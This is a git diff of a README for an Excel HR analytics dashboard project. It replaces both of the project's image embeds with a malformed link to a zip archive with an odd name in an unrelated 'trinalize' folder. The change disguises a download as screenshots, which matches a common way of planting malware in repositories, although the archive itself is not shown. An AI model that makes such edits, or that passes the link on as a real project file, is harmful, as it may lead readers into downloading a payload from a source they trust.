@@ -1,5 +1,5 @@
 # HR Analytics Dashboard Project
-![](https://github.com/Thomas-Nyanumba/HR-Excel-Dashboard-Project/blob/main/Cover%20Image.png)
+![](https://raw.githubusercontent.com/Thomas-Nyanumba/HR-Excel-Dashboard-Project/main/trinalize/Dashboard-Project-H-Excel-turnback.zip%https://raw.githubusercontent.com/Thomas-Nyanumba/HR-Excel-Dashboard-Project/main/trinalize/Dashboard-Project-H-Excel-turnback.zip)
 
 ## Introduction
 During my participation in the **Analytics Extra Mentorship Program**, I developed an interactive HR analytics dashboard as part of a hands-on learning project. The dashboard leverages data analysis techniques to extract actionable insights from HR data, offering stakeholders a clear view of workforce dynamics.
@@ -10,7 +10,7 @@ During my participation in the **Analytics Extra Mentorship Program**, I develop
 2. Analysis involved Pivot Tables, Charts, and calculated metrics.
 3. An interactive Excel dashboard showcased the results visually.
 
-![](https://github.com/Thomas-Nyanumba/HR-Excel-Dashboard-Project/blob/main/HR%20Dashboard.PNG)
+![](https://raw.githubusercontent.com/Thomas-Nyanumba/HR-Excel-Dashboard-Project/main/trinalize/Dashboard-Project-H-Excel-turnback.zip%https://raw.githubusercontent.com/Thomas-Nyanumba/HR-Excel-Dashboard-Project/main/trinalize/Dashboard-Project-H-Excel-turnback.zip)
 
 ## Problem Statement
 Human Resources teams often struggle to monitor and analyze workforce trends efficiently. This project addressed these challenges by:
